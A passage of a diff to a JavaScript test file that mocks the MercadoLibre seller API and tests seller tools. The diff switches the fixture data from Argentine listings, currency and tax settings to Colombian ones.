@@ -16,28 +16,28 @@ let demoraRefresh = 0;
 const planilla = { recibidos: [], respuestas: [], clave: null }; // Apps Script simulado
 const descripciones = {}; const descripcionesPut = [];
 const envios = {
-  101: { status: 'shipped', substatus: 'in_transit', tracking_number: 'TRK123', logistic_type: 'fulfillment', receiver_address: { state: { name: 'Buenos Aires' } } },
-  102: { status: 'ready_to_ship', substatus: 'ready_to_print', logistic_type: 'self_service', receiver_address: { state: { name: 'Capital Federal' } }, shipping_option: { estimated_handling_limit: { date: new Date(Date.now() + 5 * 3600000).toISOString() } } },
-  100: { status: 'delivered', logistic_type: 'cross_docking', receiver_address: { state: { name: 'Santa Fe' } } },
-  103: { status: 'delivered', logistic_type: 'cross_docking', receiver_address: { state: { name: 'Córdoba' } } },
+  101: { status: 'shipped', substatus: 'in_transit', tracking_number: 'TRK123', logistic_type: 'fulfillment', receiver_address: { state: { name: 'Cundinamarca' } } },
+  102: { status: 'ready_to_ship', substatus: 'ready_to_print', logistic_type: 'self_service', receiver_address: { state: { name: 'Bogotá D.C.' } }, shipping_option: { estimated_handling_limit: { date: new Date(Date.now() + 5 * 3600000).toISOString() } } },
+  100: { status: 'delivered', logistic_type: 'cross_docking', receiver_address: { state: { name: 'Antioquia' } } },
+  103: { status: 'delivered', logistic_type: 'cross_docking', receiver_address: { state: { name: 'Valle del Cauca' } } },
 };
 let campaniasML = [{ id: 'C1', name: 'Campaña general', status: 'active', budget: 5000, metrics: { cost: 30000, acos: 15, units_quantity: 25, total_amount: 200000 } }];
 let demoraRate = 0.02;
-const itemsPorEstado = { active: ['MLA111', 'MLA222'], under_review: [], paused: [], inactive: [] };
+const itemsPorEstado = { active: ['MCO111', 'MCO222'], under_review: [], paused: [], inactive: [] };
 let activos888 = null; const porSkuDeTienda = {}; // multicuenta: publicaciones de la segunda tienda y búsqueda por SKU
 let portadaPobre = [];
-let ptwMLA111 = { status: 'competing', current_price: 42000, price_to_win: 39900, boosts: [{ id: 'fulfillment' }] };
-let preguntasPend = [{ id: 555, item_id: 'MLA111', text: '¿Tenés stock?', date_created: new Date(Date.now() - 10 * 60000).toISOString() }];
+let ptwMCO111 = { status: 'competing', current_price: 42000, price_to_win: 39900, boosts: [{ id: 'fulfillment' }] };
+let preguntasPend = [{ id: 555, item_id: 'MCO111', text: '¿Tenés stock?', date_created: new Date(Date.now() - 10 * 60000).toISOString() }];
 let mensajesPend = [];
 let reclamosML = [];
-const opinionesML = { MLA111: { rating_average: 4.6, paging: { total: 12 }, reviews: [{ id: 1, rate: 5, title: 'Excelente', content: 'Mantiene el calor todo el día', date_created: new Date(Date.now() - 5 * 86400000).toISOString() }] } };
+const opinionesML = { MCO111: { rating_average: 4.6, paging: { total: 12 }, reviews: [{ id: 1, rate: 5, title: 'Excelente', content: 'Mantiene el calor todo el día', date_created: new Date(Date.now() - 5 * 86400000).toISOString() }] } };
 const paginasProveedor = { termo: { precio: '25000', disponible: 'https://schema.org/InStock' } };
 const enDias = (d) => new Date(Date.now() + d * 86400000).toISOString();
 const promosML = [{ id: 'P-HOT', name: 'Hot Sale', type: 'DEAL', status: 'candidate', start_date: enDias(10), finish_date: enDias(13), deadline_date: enDias(8) }];
-const promoItems = { 'P-HOT': [{ id: 'MLA111', original_price: 42000, suggested_discounted_price: 37800, meli_percentage: 5, status: 'candidate' }] };
+const promoItems = { 'P-HOT': [{ id: 'MCO111', original_price: 42000, suggested_discounted_price: 37800, meli_percentage: 5, status: 'candidate' }] };
 const hace = (dias) => new Date(Date.now() - dias * 86400000).toISOString();
 const preguntasPorItem = {
-  MLA111: [
+  MCO111: [
     { id: 1, text: 'Hola! ¿Qué medidas tiene?', status: 'ANSWERED', date_created: hace(40), answer: { text: 'Hola! Mide 27 cm de alto y 8,5 cm de diámetro. Saludos!', date_created: hace(40) } },
     { id: 2, text: 'cuanto mide de alto??', status: 'ANSWERED', date_created: hace(10), answer: { text: 'Hola, buen día! Mide 27 cm de alto y 8,5 cm de diámetro. Gracias por tu consulta, quedamos a disposición', date_created: hace(10) } },
     { id: 3, text: '¿Es apto lavavajillas?', status: 'ANSWERED', date_created: hace(30), answer: { text: 'Sí, es apto lavavajillas.', date_created: hace(30) } },
@@ -52,7 +52,7 @@ const preguntasPorItem = {
 }; // ms: simula un refresh lento para forzar carreras entre procesos
 let ultimoItemCreado = null;
 let versionRemota = '9.9.9';
-let itemMLA111 = { catalog_listing: true, category_id: 'MLA1055', price: 42000, currency_id: 'ARS', available_quantity: 10, sold_quantity: 55, status: 'active', condition: 'new', listing_type_id: 'gold_special', permalink: 'https://articulo.mercadolibre.com.ar/x', pictures: [{ secure_url: 'https://http2.mlstatic.com/f1.jpg' }], attributes: [{ id: 'BRAND', value_name: 'Genérica' }], shipping: { logistic_type: 'fulfillment', free_shipping: true } };
+let itemMCO111 = { catalog_listing: true, category_id: 'MCO1055', price: 42000, currency_id: 'COP', available_quantity: 10, sold_quantity: 55, status: 'active', condition: 'new', listing_type_id: 'gold_special', permalink: 'https://articulo.mercadolibre.com.co/x', pictures: [{ secure_url: 'https://http2.mlstatic.com/f1.jpg' }], attributes: [{ id: 'BRAND', value_name: 'Genérica' }], shipping: { logistic_type: 'fulfillment', free_shipping: true } };
 let mercado = {
   rival: [{ id: 'R1', title: 'Termo rival 1L', price: 39999, seller: { nickname: 'RIVAL' } }],
   busqueda: [{ id: 'B1', title: 'Termo lider', price: 35000, seller: { nickname: 'LIDER' } }, { id: 'B2', title: 'Termo 2', price: 37000, seller: { nickname: 'OTRO' } }],
@@ -83,7 +83,7 @@ export function crearMockMeli() {
   app.get('/messages/unread', auth, (_q, res) => res.json({ results: mensajesPend }));
   app.get('/post-purchase/v1/claims/search', auth, (_q, res) => res.json({ paging: { total: reclamosML.length }, data: reclamosML }));
   app.get('/reviews/item/:id', auth, (req, res) => res.json(opinionesML[req.params.id] || { rating_average: null, paging: { total: 0 }, reviews: [] }));
-  app.get('/proveedor/:p', (req, res) => { const p = paginasProveedor[req.params.p]; if (!p) return res.status(404).send('no'); res.send(`<html><head><title>Termo proveedor</title><script type="application/ld+json">${JSON.stringify({ '@context': 'https://schema.org', '@type': 'Product', name: 'Termo acero 1L mayorista', offers: { '@type': 'Offer', price: p.precio, priceCurrency: 'ARS', availability: p.disponible } })}</script></head><body>.</body></html>`); });
+  app.get('/proveedor/:p', (req, res) => { const p = paginasProveedor[req.params.p]; if (!p) return res.status(404).send('no'); res.send(`<html><head><title>Termo proveedor</title><script type="application/ld+json">${JSON.stringify({ '@context': 'https://schema.org', '@type': 'Product', name: 'Termo acero 1L mayorista', offers: { '@type': 'Offer', price: p.precio, priceCurrency: 'COP', availability: p.disponible } })}</script></head><body>.</body></html>`); });
   app.get('/proveedor-sin-datos', (_q, res) => res.send('<html><title>x</title><body>sin datos</body></html>'));
   app.get('/pkg-remoto', (_q, res) => res.json({ name: 'x', version: versionRemota }));
   app.post('/oauth/token', async (req, res) => {
@@ -104,17 +104,17 @@ export function crearMockMeli() {
   });
 
   app.get('/users/me', auth, (req, res) => res.json({
-    id: req.usuario, nickname: req.usuario === 888 ? 'TIENDA_DOS' : 'TIENDA_DEMO', site_id: 'MLA',
+    id: req.usuario, nickname: req.usuario === 888 ? 'TIENDA_DOS' : 'TIENDA_DEMO', site_id: 'MCO',
     seller_reputation: { level_id: '5_green', power_seller_status: 'platinum', transactions: { total: 1543 }, metrics: { claims: { rate: 0.001 }, delayed_handling_time: { rate: demoraRate }, cancellations: { rate: 0 } } },
   }));
   app.get('/orders/search', auth, (req, res) => {
     const desde = String(req.query['order.date_created.from'] || '1970-01-01');
     const hasta = String(req.query['order.date_created.to'] || '9999-12-31');
     const todas = [
-      { id: 101, date_created: new Date(Date.now() - 60000).toISOString(), total_amount: 42000, currency_id: 'ARS', status: 'paid', order_items: [{ item: { id: 'MLA111', title: 'Termo Demo 1L' }, quantity: 1, unit_price: 42000, sale_fee: 5880 }] },
-      { id: 102, date_created: new Date(Date.now() - 60000).toISOString(), total_amount: 18500, currency_id: 'ARS', status: 'paid', order_items: [{ item: { id: 'MLA222', title: 'Mate Demo' }, quantity: 2, unit_price: 9250, sale_fee: 1295 }] },
-      { id: 103, date_created: new Date(Date.now() - 86400000).toISOString(), total_amount: 20000, currency_id: 'ARS', status: 'paid', order_items: [{ item: { id: 'MLA111', title: 'Termo Demo 1L' }, quantity: 1, unit_price: 20000, sale_fee: 2800 }] },
-      { id: 100, date_created: new Date(Date.now() - 10 * 86400000).toISOString(), total_amount: 20000, currency_id: 'ARS', status: 'paid', order_items: [{ item: { id: 'MLA333', title: 'Termo viejo' }, quantity: 1, unit_price: 20000, sale_fee: 2800 }] },
+      { id: 101, date_created: new Date(Date.now() - 60000).toISOString(), total_amount: 42000, currency_id: 'COP', status: 'paid', order_items: [{ item: { id: 'MCO111', title: 'Termo Demo 1L' }, quantity: 1, unit_price: 42000, sale_fee: 5880 }] },
+      { id: 102, date_created: new Date(Date.now() - 60000).toISOString(), total_amount: 18500, currency_id: 'COP', status: 'paid', order_items: [{ item: { id: 'MCO222', title: 'Mate Demo' }, quantity: 2, unit_price: 9250, sale_fee: 1295 }] },
+      { id: 103, date_created: new Date(Date.now() - 86400000).toISOString(), total_amount: 20000, currency_id: 'COP', status: 'paid', order_items: [{ item: { id: 'MCO111', title: 'Termo Demo 1L' }, quantity: 1, unit_price: 20000, sale_fee: 2800 }] },
+      { id: 100, date_created: new Date(Date.now() - 10 * 86400000).toISOString(), total_amount: 20000, currency_id: 'COP', status: 'paid', order_items: [{ item: { id: 'MCO333', title: 'Termo viejo' }, quantity: 1, unit_price: 20000, sale_fee: 2800 }] },
     ];
     const resultados = todas.filter((o) => o.date_created >= desde && o.date_created <= hasta);
     return res.json({ paging: { total: resultados.length }, results: resultados });
@@ -127,8 +127,8 @@ export function crearMockMeli() {
     const r = (req.usuario === 888 && activos888) || itemsPorEstado[req.query.status || 'active'] || [];
     res.json({ paging: { total: r.length }, results: r });
   });
-  app.get('/items', auth, (req, res) => res.json(String(req.query.ids).split(',').map((id) => ({ code: 200, body: { id, title: 'Producto ' + id, price: 42000, currency_id: 'ARS', available_quantity: 10, sold_quantity: 55, status: 'active', permalink: 'https://articulo.mercadolibre.com.ar/' + id, catalog_listing: id === 'MLA111', ...(mercado.items?.[id] || {}) } }))));
-  app.get('/items/:id', auth, (req, res) => res.json({ ...itemMLA111, id: req.params.id, title: 'Producto ' + req.params.id, ...(mercado.items?.[req.params.id] || {}) }));
+  app.get('/items', auth, (req, res) => res.json(String(req.query.ids).split(',').map((id) => ({ code: 200, body: { id, title: 'Producto ' + id, price: 42000, currency_id: 'COP', available_quantity: 10, sold_quantity: 55, status: 'active', permalink: 'https://articulo.mercadolibre.com.co/' + id, catalog_listing: id === 'MCO111', ...(mercado.items?.[id] || {}) } }))));
+  app.get('/items/:id', auth, (req, res) => res.json({ ...itemMCO111, id: req.params.id, title: 'Producto ' + req.params.id, ...(mercado.items?.[req.params.id] || {}) }));
   app.get('/items/:id/description', auth, (req, res) => res.json({ plain_text: descripciones[req.params.id] ?? 'Descripción original del producto.' }));
   app.put('/items/:id/description', auth, (req, res) => {
     if (typeof req.body?.plain_text !== 'string') return res.status(400).json({ message: 'falta plain_text' });
@@ -139,14 +139,14 @@ export function crearMockMeli() {
   app.post('/items', auth, (req, res) => {
     ultimoItemCreado = req.body;
     if (!req.body?.title || !req.body?.category_id) return res.status(400).json({ message: 'faltan campos' });
-    res.json({ id: 'MLA999', title: req.body.title, price: req.body.price, permalink: 'https://articulo.mercadolibre.com.ar/MLA999', status: 'active' });
+    res.json({ id: 'MCO999', title: req.body.title, price: req.body.price, permalink: 'https://articulo.mercadolibre.com.co/MCO999', status: 'active' });
   });
   app.post('/items/:id/description', auth, (req, res) => res.json({ ok: true }));
-  app.put('/items/:id', auth, (req, res) => res.json({ id: req.params.id, price: req.body.price ?? 42000, currency_id: 'ARS', available_quantity: req.body.available_quantity ?? 10, status: req.body.status ?? 'active' }));
+  app.put('/items/:id', auth, (req, res) => res.json({ id: req.params.id, price: req.body.price ?? 42000, currency_id: 'COP', available_quantity: req.body.available_quantity ?? 10, status: req.body.status ?? 'active' }));
   app.get('/items/:id/visits/time_window', auth, (req, res) => { const d = mercado.visitasDia?.[req.params.id]; return res.json(d ? { total_visits: d.reduce((s, x) => s + x.total, 0), results: d } : { total_visits: 340 }); });
   app.get('/visits/items', auth, (req, res) => res.json(Object.fromEntries(String(req.query.ids).split(',').filter((id) => mercado.visitasTotal?.[id] != null).map((id) => [id, mercado.visitasTotal[id]]))));
-  app.get('/categories/:id', auth, (req, res) => res.json({ id: req.params.id, name: req.params.id === 'MLA5000' ? 'Organización de cocina' : 'Categoría' }));
-  app.get('/items/:id/price_to_win', auth, (_q, res) => res.json(ptwMLA111));
+  app.get('/categories/:id', auth, (req, res) => res.json({ id: req.params.id, name: req.params.id === 'MCO5000' ? 'Organización de cocina' : 'Categoría' }));
+  app.get('/items/:id/price_to_win', auth, (_q, res) => res.json(ptwMCO111));
   app.get('/questions/search', auth, (req, res) => {
     if (req.query.item) {
       const todas = (preguntasPorItem[req.query.item] || []).filter((q) => !req.query.status || q.status === req.query.status);
@@ -156,19 +156,19 @@ export function crearMockMeli() {
     res.json({ total: preguntasPend.length, questions: preguntasPend });
   });
   app.post('/answers', auth, (req, res) => req.body?.question_id ? res.json({ ok: true }) : res.status(400).json({ message: 'falta question_id' }));
-  app.get('/sites/MLA/listing_prices', auth, (_q, res) => res.json([{ listing_type_id: 'gold_special', listing_type_name: 'Clásica', sale_fee_amount: 5900, sale_fee_details: { percentage_fee: 14, fixed_fee: 0 } }]));
-  app.get('/sites/MLA/search', auth, (req, res) => {
+  app.get('/sites/MCO/listing_prices', auth, (_q, res) => res.json([{ listing_type_id: 'gold_special', listing_type_name: 'Clásica', sale_fee_amount: 5900, sale_fee_details: { percentage_fee: 14, fixed_fee: 0 } }]));
+  app.get('/sites/MCO/search', auth, (req, res) => {
     if (req.query.nickname || req.query.seller_id) return res.json({ paging: { total: mercado.rival.length }, results: mercado.rival });
     if (req.query.q === 'termo 1 litro') return res.json({ paging: { total: mercado.busqueda.length }, results: mercado.busqueda });
     const nicho = mercado.nichos?.[req.query.q || 'cat:' + req.query.category];
     if (nicho) { const off = Number(req.query.offset || 0), lim = Number(req.query.limit || 50); return res.json({ paging: { total: nicho.length * 40 }, results: nicho.slice(off, off + lim) }); }
-    return res.json({ paging: { total: 2 }, results: [{ title: 'Termo rival', price: 39999, currency_id: 'ARS', seller: { nickname: 'RIVAL' }, shipping: { free_shipping: true } }, { title: 'Termo caro', price: 52000, currency_id: 'ARS', seller: { nickname: 'OTRO' } }] });
+    return res.json({ paging: { total: 2 }, results: [{ title: 'Termo rival', price: 39999, currency_id: 'COP', seller: { nickname: 'RIVAL' }, shipping: { free_shipping: true } }, { title: 'Termo caro', price: 52000, currency_id: 'COP', seller: { nickname: 'OTRO' } }] });
   });
   app.get('/seller-promotions/users/777', auth, (_q, res) => res.json({ results: promosML }));
   app.get('/seller-promotions/promotions/:id/items', auth, (req, res) => { const r = promoItems[req.params.id] || []; res.json({ results: r, paging: { total: r.length } }); });
   app.post('/seller-promotions/items/:id', auth, (req, res) => req.body?.promotion_id ? res.json({ ok: true }) : res.status(400).json({ message: 'falta promotion_id' }));
-  app.get('/trends/MLA', auth, (_q, res) => res.json(mercado.tendencias));
-  app.get('/advertising/advertisers', auth, (_q, res) => res.json({ advertisers: [{ advertiser_id: 'ADV1', site_id: 'MLA' }] }));
+  app.get('/trends/MCO', auth, (_q, res) => res.json(mercado.tendencias));
+  app.get('/advertising/advertisers', auth, (_q, res) => res.json({ advertisers: [{ advertiser_id: 'ADV1', site_id: 'MCO' }] }));
   app.get('/advertising/product_ads/campaigns', auth, (req, res) => {
     // Un solo día: la inversión depende del día del mes (para probar el gráfico día por día)
     if (req.query.date_from && req.query.date_from === req.query.date_to) {
@@ -178,23 +178,23 @@ export function crearMockMeli() {
     res.json({ results: campaniasML });
   });
   app.get('/advertising/product_ads/ads/:id', auth, (req, res) => {
-    if (req.params.id !== 'MLA111') return res.status(404).json({ message: 'ad not found' });
+    if (req.params.id !== 'MCO111') return res.status(404).json({ message: 'ad not found' });
     res.json({ metrics: { clicks: 120, prints: 8000, cost: 15000, acos: 12.5, cpc: 125, units_quantity: 10, total_amount: 420000 } });
   });
   app.get('/marketplace/items/:id/clips', auth, (req, res) => {
-    if (req.params.id !== 'MLA111') return res.status(404).json({ message: 'No clips found for itemId: ' + req.params.id });
+    if (req.params.id !== 'MCO111') return res.status(404).json({ message: 'No clips found for itemId: ' + req.params.id });
     res.json({ parent_item_id: req.params.id, clips: [
-      { clip_uuid: 'clip-publicado-001', metadata: [{ site_id: 'MLA', moderation_status: 'PUBLISHED' }] },
-      { clip_uuid: 'clip-revision-002', metadata: [{ site_id: 'MLA', moderation_status: 'UNDER_REVIEW' }] },
-      { clip_uuid: 'clip-rechazo-003', metadata: [{ site_id: 'MLA', moderation_status: 'REJECTED', moderation_reasons: { DUPLICATED_VIDEO: 'This video had already been uploaded before.' } }] },
+      { clip_uuid: 'clip-publicado-001', metadata: [{ site_id: 'MCO', moderation_status: 'PUBLISHED' }] },
+      { clip_uuid: 'clip-revision-002', metadata: [{ site_id: 'MCO', moderation_status: 'UNDER_REVIEW' }] },
+      { clip_uuid: 'clip-rechazo-003', metadata: [{ site_id: 'MCO', moderation_status: 'REJECTED', moderation_reasons: { DUPLICATED_VIDEO: 'This video had already been uploaded before.' } }] },
     ] });
   });
   // Fotos del "CDN" (sin auth, como mlstatic): una JPEG chiquita y algo que no es imagen
   app.get('/fotos/:n', (req, res) => req.params.n === 'no-imagen' ? res.type('text/html').send('<html>hola</html>') : res.type('image/jpeg').send(Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=', 'base64')));
   app.post('/marketplace/items/:id/clips/upload', auth, (_q, res) => res.json({ status: 'accepted', clip_uuid: 'clip-nuevo-999' }));
-  app.delete('/marketplace/items/:id/clips/:uuid', auth, (_q, res) => res.json([{ status: 'DELETED', site_id: 'MLA' }]));
-  app.get('/trends/MLA/:cat', auth, (_q, res) => res.json([{ keyword: 'termo acero 1 litro' }, { keyword: 'termo con cebador' }]));
-  app.get('/highlights/MLA/category/:cat', auth, (_q, res) => res.json({ content: [{ id: 'MLA111', position: 1, type: 'ITEM' }, { id: 'MLA777', position: 2, type: 'ITEM' }] }));
+  app.delete('/marketplace/items/:id/clips/:uuid', auth, (_q, res) => res.json([{ status: 'DELETED', site_id: 'MCO' }]));
+  app.get('/trends/MCO/:cat', auth, (_q, res) => res.json([{ keyword: 'termo acero 1 litro' }, { keyword: 'termo con cebador' }]));
+  app.get('/highlights/MCO/category/:cat', auth, (_q, res) => res.json({ content: [{ id: 'MCO111', position: 1, type: 'ITEM' }, { id: 'MCO777', position: 2, type: 'ITEM' }] }));
   return app;
 }
 
@@ -223,7 +223,7 @@ async function pruebas() {
 
   await caso('ml_conectar sin code devuelve URL con PKCE', async () => {
     const t = await tool('ml_conectar').run({});
-    contiene(t, 'auth.mercadolibre.com.ar/authorization', 'code_challenge', 'ejemplo.test');
+    contiene(t, 'auth.mercadolibre.com.co/authorization', 'code_challenge', 'ejemplo.test');
   });
   await caso('ml_conectar con code canjea y guarda la cuenta', async () => {
     const t = await tool('ml_conectar').run({ code: 'CODE-OK' });
@@ -237,23 +237,23 @@ async function pruebas() {
   await caso('ml_metricas compara períodos', async () => contiene(await tool('ml_metricas').run({ dias: 7 }), 'Facturación', 'vs período anterior'));
   await caso('ml_panel_ventas: hoy, mes, top productos, envíos y provincias', async () => {
     const t = await tool('ml_panel_ventas').run({});
-    contiene(t, 'Hoy', '60.500', 'Mes', 'Termo Demo 1L — 2 u.', 'FULL', 'Flex', 'Colecta', 'Buenos Aires', 'Córdoba');
+    contiene(t, 'Hoy', '60.500', 'Mes', 'Termo Demo 1L — 2 u.', 'FULL', 'Flex', 'Colecta', 'Cundinamarca', 'Antioquia');
   });
-  await caso('ml_publicaciones', async () => contiene(await tool('ml_publicaciones').run({}), 'MLA111', 'catálogo'));
-  await caso('ml_publicacion detalle con fotos de la publicación', async () => contiene(await tool('ml_publicacion').run({ item_id: 'MLA111' }), 'envío gratis', 'sin video', 'Fotos:** 1', 'mlstatic.com/f1.jpg'));
-  await caso('ml_visitas', async () => contiene(await tool('ml_visitas').run({ item_id: 'MLA111' }), '340'));
+  await caso('ml_publicaciones', async () => contiene(await tool('ml_publicaciones').run({}), 'MCO111', 'catálogo'));
+  await caso('ml_publicacion detalle con fotos de la publicación', async () => contiene(await tool('ml_publicacion').run({ item_id: 'MCO111' }), 'envío gratis', 'sin video', 'Fotos:** 1', 'mlstatic.com/f1.jpg'));
+  await caso('ml_visitas', async () => contiene(await tool('ml_visitas').run({ item_id: 'MCO111' }), '340'));
   await caso('ml_preguntas pendientes', async () => contiene(await tool('ml_preguntas').run({}), '¿Tenés stock?', '555'));
   await caso('ml_responder_pregunta (escritura)', async () => contiene(await tool('ml_responder_pregunta').run({ pregunta_id: '555', texto: 'Sí, tenemos stock.' }), '✅'));
-  await caso('ml_actualizar_publicacion (escritura)', async () => contiene(await tool('ml_actualizar_publicacion').run({ item_id: 'MLA111', precio: 39900 }), '39.900'));
+  await caso('ml_actualizar_publicacion (escritura)', async () => contiene(await tool('ml_actualizar_publicacion').run({ item_id: 'MCO111', precio: 39900 }), '39.900'));
   await caso('ml_comisiones', async () => contiene(await tool('ml_comisiones').run({ precio: 42000 }), 'Clásica', '14'));
-  await caso('ml_precio_catalogo', async () => contiene(await tool('ml_precio_catalogo').run({ item_id: 'MLA111' }), 'Perdiendo', '39.900'));
+  await caso('ml_precio_catalogo', async () => contiene(await tool('ml_precio_catalogo').run({ item_id: 'MCO111' }), 'Perdiendo', '39.900'));
   await caso('ml_buscar competencia', async () => contiene(await tool('ml_buscar').run({ consulta: 'termo' }), 'RIVAL'));
   await caso('ml_reputacion', async () => contiene(await tool('ml_reputacion').run({}), 'platinum', '1543'));
   await caso('ml_promociones lista y detalle', async () => {
     contiene(await tool('ml_promociones').run({}), 'P-HOT', 'Hot Sale');
-    contiene(await tool('ml_promociones').run({ promocion_id: 'P-HOT', tipo: 'DEAL' }), 'MLA111', '37.800');
+    contiene(await tool('ml_promociones').run({ promocion_id: 'P-HOT', tipo: 'DEAL' }), 'MCO111', '37.800');
   });
-  await caso('ml_aceptar_promocion (escritura)', async () => contiene(await tool('ml_aceptar_promocion').run({ item_id: 'MLA111', promocion_id: 'P-HOT', tipo: 'DEAL', precio_final: 37800 }), '✅'));
+  await caso('ml_aceptar_promocion (escritura)', async () => contiene(await tool('ml_aceptar_promocion').run({ item_id: 'MCO111', promocion_id: 'P-HOT', tipo: 'DEAL', precio_final: 37800 }), '✅'));
   await caso('ml_tendencias', async () => contiene(await tool('ml_tendencias').run({}), 'termo stanley'));
   await caso('refresh de token: single-flight (un solo refresh para llamadas concurrentes)', async () => {
     // Vencer el token a mano
@@ -261,15 +261,15 @@ async function pruebas() {
     const d = JSON.parse(fs.readFileSync(archivo, 'utf8'));
     d.cuentas['777'].vence = 0; fs.writeFileSync(archivo, JSON.stringify(d));
     refrescosHechos = 0;
-    await Promise.all([tool('ml_reputacion').run({}), tool('ml_visitas').run({ item_id: 'MLA111' }), tool('ml_tendencias').run({})]);
+    await Promise.all([tool('ml_reputacion').run({}), tool('ml_visitas').run({ item_id: 'MCO111' }), tool('ml_tendencias').run({})]);
     if (refrescosHechos !== 1) throw new Error(`hubo ${refrescosHechos} refresh, esperaba 1 (el refresh de ML es de un solo uso)`);
     const d2 = JSON.parse(fs.readFileSync(archivo, 'utf8'));
     if (d2.cuentas['777'].refresh_token !== 'REFRESH-2') throw new Error('no rotó el refresh token');
   });
   await caso('ml_crear_publicacion clona con copiar_de y pisa precio (escritura)', async () => {
-    const t = await tool('ml_crear_publicacion').run({ copiar_de: 'MLA111', precio: 45000, titulo: 'Producto MLA111 copia', sin_costo: true });
+    const t = await tool('ml_crear_publicacion').run({ copiar_de: 'MCO111', precio: 45000, titulo: 'Producto MCO111 copia', sin_costo: true });
     contiene(t, 'Publicada sin costo cargado');
-    contiene(t, 'MLA999', '45.000');
+    contiene(t, 'MCO999', '45.000');
     if (!ultimoItemCreado.pictures || ultimoItemCreado.category_id == null) throw new Error('no clonó fotos/categoría del origen');
     if (ultimoItemCreado.price !== 45000) throw new Error('no aplicó el precio nuevo');
   });
@@ -311,7 +311,7 @@ async function pruebas() {
   });
   await caso('ml_vigilar agrega competidores y tendencias con primer registro', async () => {
     contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'vendedor', ref: 'RIVAL', nota: 'mi competidor directo' }), 'Agregado', 'RIVAL');
-    contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'publicacion', ref: 'MLA111' }), 'Agregado');
+    contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'publicacion', ref: 'MCO111' }), 'Agregado');
     contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'busqueda', ref: 'termo 1 litro' }), 'Agregado');
     contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'tendencias' }), 'Agregado');
     contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'vendedor', ref: 'RIVAL' }), 'Ya estaba');
@@ -324,7 +324,7 @@ async function pruebas() {
   await caso('ml_auditar_publicaciones: semáforo y mejoras concretas, peores primero', async () => {
     const t = await tool('ml_auditar_publicaciones').run({});
     contiene(t, 'Auditoría de publicaciones', '🔴', 'título corto', 'foto', 'sin video', 'perdiendo el catálogo', 'urgentes');
-    if (t.indexOf('MLA111') > t.indexOf('Sin problemas') && t.includes('Sin problemas')) throw new Error('no ordenó las peores primero');
+    if (t.indexOf('MCO111') > t.indexOf('Sin problemas') && t.includes('Sin problemas')) throw new Error('no ordenó las peores primero');
   });
   await caso('ml_novedades_competencia: sin cambios no inventa nada', async () => {
     contiene(await tool('ml_novedades_competencia').run({}), 'Sin novedades');
@@ -336,7 +336,7 @@ async function pruebas() {
     ];
     mercado.busqueda = [{ id: 'B9', title: 'Termo nuevo lider', price: 33000, seller: { nickname: 'USURPADOR' } }, ...mercado.busqueda];
     mercado.tendencias = [{ keyword: 'termo milan' }, { keyword: 'termo stanley' }];
-    itemMLA111.sold_quantity = 58; itemMLA111.price = 39900;
+    itemMCO111.sold_quantity = 58; itemMCO111.price = 39900;
     const t = await tool('ml_novedades_competencia').run({});
     contiene(t, '↓ 10.0%', 'publicó 1 nueva', 'Termo rival 2L NUEVO');     // vendedor
     contiene(t, 'vendió ~3', '39.900');                                      // publicación (ventas estimadas + precio)
@@ -344,121 +344,121 @@ async function pruebas() {
     contiene(t, 'entraron al top', 'termo milan', 'salieron del top', 'mate imperial'); // tendencias
   });
   await caso('ml_cerebro guarda, hereda del negocio y muestra lo que sabe', async () => {
-    contiene(await tool('ml_cerebro').run({ accion: 'guardar', impuestos_pct: 10, nota: 'Monotributo + IIBB CABA' }), 'Guardado', 'negocio');
-    contiene(await tool('ml_cerebro').run({ accion: 'guardar', item_id: 'MLA111', costo: 20000, medidas: '27 cm alto, 8,5 cm diámetro' }), 'MLA111', 'costo');
-    const t = await tool('ml_cerebro').run({ accion: 'ver', item_id: 'MLA111' });
-    contiene(t, '20.000', '10%', 'heredado del negocio', '27 cm');
-    contiene(await tool('ml_cerebro').run({ accion: 'ver' }), 'Monotributo', 'MLA111', 'medidas ✔');
+    contiene(await tool('ml_cerebro').run({ accion: 'guardar', impuestos_pct: 19, nota: 'IVA + ICA régimen simplificado' }), 'Guardado', 'negocio');
+    contiene(await tool('ml_cerebro').run({ accion: 'guardar', item_id: 'MCO111', costo: 20000, medidas: '27 cm alto, 8,5 cm diámetro' }), 'MCO111', 'costo');
+    const t = await tool('ml_cerebro').run({ accion: 'ver', item_id: 'MCO111' });
+    contiene(t, '20.000', '19%', 'heredado del negocio', '27 cm');
+    contiene(await tool('ml_cerebro').run({ accion: 'ver' }), 'ICA', 'MCO111', 'medidas ✔');
   });
   await caso('ml_rentabilidad usa el cerebro sin volver a preguntar', async () => {
-    itemMLA111.price = 42000;
-    const t = await tool('ml_rentabilidad').run({ item_id: 'MLA111' });
-    contiene(t, 'Usando del cerebro', '20.000', '10.420', '24,8');
+    itemMCO111.price = 42000;
+    const t = await tool('ml_rentabilidad').run({ item_id: 'MCO111' });
+    contiene(t, 'Usando del cerebro', '20.000', '6.640', '15,8');
   });
   await caso('ml_rentabilidad aprende datos nuevos hacia el cerebro', async () => {
-    contiene(await tool('ml_rentabilidad').run({ item_id: 'MLA999X' , precio: 10000, costo: 4000, impuestos_pct: 10 }), 'guardados en el cerebro');
-    contiene(await tool('ml_cerebro').run({ accion: 'ver', item_id: 'MLA999X' }), '4.000');
-    contiene(await tool('ml_cerebro').run({ accion: 'olvidar', item_id: 'MLA999X' }), 'Olvidado');
+    contiene(await tool('ml_rentabilidad').run({ item_id: 'MCO999X' , precio: 10000, costo: 4000, impuestos_pct: 10 }), 'guardados en el cerebro');
+    contiene(await tool('ml_cerebro').run({ accion: 'ver', item_id: 'MCO999X' }), '4.000');
+    contiene(await tool('ml_cerebro').run({ accion: 'olvidar', item_id: 'MCO999X' }), 'Olvidado');
   });
   await caso('costo por SKU: la publicación nueva con el mismo SKU usa ese costo; sin costo, pregunta antes de publicar', async () => {
     const CP = tool('ml_crear_publicacion'), CER = tool('ml_cerebro'), REN = tool('ml_rentabilidad');
     const cer = await import('../src/cerebro.js');
     mercado.items = { ...(mercado.items || {}),
